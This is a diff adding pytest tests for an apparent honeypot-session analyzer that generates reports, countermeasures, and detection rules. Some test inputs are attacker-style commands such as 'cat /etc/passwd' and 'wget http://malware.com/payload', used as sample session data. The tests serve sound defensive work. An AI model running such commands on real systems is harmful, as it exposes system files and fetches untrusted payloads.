@@ -263,3 +263,148 @@ class TestLLMAnalyzerWithMockedOllama:
         
         with patch('src.llm_analyzer._HAS_OLLAMA', True):
             assert analyzer.is_available() is True
+
+
+class TestLLMAnalyzerFormalReport:
+    """Tests for LLMAnalyzer formal report methods."""
+
+    @pytest.fixture
+    def mock_analyzer(self):
+        """Create an LLMAnalyzer with mocked dependencies."""
+        with patch('src.llm_analyzer._HAS_OLLAMA', False):
+            from src.llm_analyzer import LLMAnalyzer
+            analyzer = LLMAnalyzer()
+            return analyzer
+
+    def test_generate_formal_report_returns_error_without_deps(self, mock_analyzer):
+        """Test that generate_formal_report returns error when not available."""
+        session = {
+            "id": 1,
+            "src_ip": "192.168.1.100",
+            "commands": [{"command": "ls -la"}]
+        }
+        
+        result = mock_analyzer.generate_formal_report(session)
+        
+        assert "error" in result
+        assert result.get("generated") is False
+
+
+class TestLLMAnalyzerActiveCountermeasures:
+    """Tests for LLMAnalyzer active countermeasure methods."""
+
+    @pytest.fixture
+    def mock_analyzer(self):
+        """Create an LLMAnalyzer with mocked dependencies."""
+        with patch('src.llm_analyzer._HAS_OLLAMA', False):
+            from src.llm_analyzer import LLMAnalyzer
+            analyzer = LLMAnalyzer()
+            return analyzer
+
+    def test_recommend_active_countermeasures_returns_error_without_deps(self, mock_analyzer):
+        """Test that recommend_active_countermeasures returns error when not available."""
+        session = {
+            "id": 1,
+            "src_ip": "192.168.1.100",
+            "commands": [{"command": "ls -la"}]
+        }
+        
+        result = mock_analyzer.recommend_active_countermeasures(session)
+        
+        assert "error" in result
+        assert result.get("recommended") is False
+
+
+class TestLLMAnalyzerOutputPlugin:
+    """Tests for LLMAnalyzer output plugin generation methods."""
+
+    @pytest.fixture
+    def mock_analyzer(self):
+        """Create an LLMAnalyzer with mocked dependencies."""
+        with patch('src.llm_analyzer._HAS_OLLAMA', False):
+            from src.llm_analyzer import LLMAnalyzer
+            analyzer = LLMAnalyzer()
+            return analyzer
+
+    def test_generate_output_plugin_code_returns_error_without_deps(self, mock_analyzer):
+        """Test that generate_output_plugin_code returns error when not available."""
+        trigger_events = ["cowrie.command.input"]
+        response_actions = ["alert"]
+        
+        result = mock_analyzer.generate_output_plugin_code(trigger_events, response_actions)
+        
+        assert "error" in result
+        assert result.get("generated") is False
+
+
+class TestLLMAnalyzerRealTimeAnalysis:
+    """Tests for LLMAnalyzer real-time analysis methods."""
+
+    @pytest.fixture
+    def mock_analyzer(self):
+        """Create an LLMAnalyzer with mocked dependencies."""
+        with patch('src.llm_analyzer._HAS_OLLAMA', False):
+            from src.llm_analyzer import LLMAnalyzer
+            analyzer = LLMAnalyzer()
+            return analyzer
+
+    def test_analyze_real_time_commands_returns_error_without_deps(self, mock_analyzer):
+        """Test that analyze_real_time_commands returns error when not available."""
+        commands = ["ls -la", "cat /etc/passwd", "wget http://malware.com/payload"]
+        
+        result = mock_analyzer.analyze_real_time_commands(commands)
+        
+        assert "error" in result
+        assert result.get("analyzed") is False
+
+
+class TestLLMAnalyzerDetectionRules:
+    """Tests for LLMAnalyzer detection rules methods."""
+
+    @pytest.fixture
+    def mock_analyzer(self):
+        """Create an LLMAnalyzer with mocked dependencies."""
+        with patch('src.llm_analyzer._HAS_OLLAMA', False):
+            from src.llm_analyzer import LLMAnalyzer
+            analyzer = LLMAnalyzer()
+            return analyzer
+
+    def test_generate_detection_rules_returns_error_without_deps(self, mock_analyzer):
+        """Test that generate_detection_rules returns error when not available."""
+        session = {
+            "id": 1,
+            "src_ip": "192.168.1.100",
+            "commands": [{"command": "wget http://malware.com/payload"}]
+        }
+        
+        result = mock_analyzer.generate_detection_rules(session)
+        
+        assert "error" in result
+        assert result.get("generated") is False
+
+
+class TestLLMAnalyzerEnums:
+    """Tests for LLMAnalyzer enums."""
+
+    def test_countermeasure_type_values(self):
+        """Test CountermeasureType enum values."""
+        from src.llm_analyzer import CountermeasureType
+        
+        assert CountermeasureType.JSON_TAIL.value == "json_tail"
+        assert CountermeasureType.MANHOLE.value == "manhole"
+        assert CountermeasureType.OUTPUT_PLUGIN.value == "output_plugin"
+        assert CountermeasureType.PROXY_MODE.value == "proxy_mode"
+        assert CountermeasureType.PLAYLOG.value == "playlog"
+
+    def test_response_action_values(self):
+        """Test ResponseAction enum values."""
+        from src.llm_analyzer import ResponseAction
+        
+        assert ResponseAction.OBSERVE.value == "observe"
+        assert ResponseAction.DELAY.value == "delay"
+        assert ResponseAction.FAKE_DATA.value == "fake_data"
+        assert ResponseAction.TARPIT.value == "tarpit"
+        assert ResponseAction.DISCONNECT.value == "disconnect"
+        assert ResponseAction.ALERT.value == "alert"
+        assert ResponseAction.CAPTURE.value == "capture"
+        assert ResponseAction.DECEPTION.value == "deception"
